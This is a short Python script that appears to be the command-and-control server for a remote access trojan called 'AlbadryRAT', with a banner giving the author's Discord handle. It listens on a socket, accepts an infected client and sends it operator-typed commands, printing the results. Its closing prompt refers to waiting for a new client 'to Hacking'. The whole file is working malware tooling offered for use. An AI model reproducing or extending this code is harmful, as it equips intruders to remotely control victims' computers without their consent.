import socket
import sys
print(f"                   ___________________________")
print(f"                  |                           |")
print(f"                  |   Welcome to AlbadryRAT   |")
print(f"                  |                           |")
print(f"                  |     Discord: albadry_0    |")
print(f"                  |___________________________|")

server_ip = "127.0.0.1"
port = 8080

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((server_ip, port))

s.listen(1)

while True:
    print(f'[+] listening as {server_ip}:{port}')
    
    client = s.accept()
    print(f'[+] New Client! {client[1]}')
    client[0].send('Connected'.encode())
    while True:
        cmd = input(">>> ")
        client[0].send(cmd.encode())
        if cmd.lower() in ['quit', 'exit', 'q', 'close']:
            break
        res = client[0].recv(1024).decode()
        print(res)
    
    client[0].close()
    cmd = input('Wait for new client to Hacking') or 'y'
    if cmd.lower() in ['n', 'No']:
        break
    
s.close()


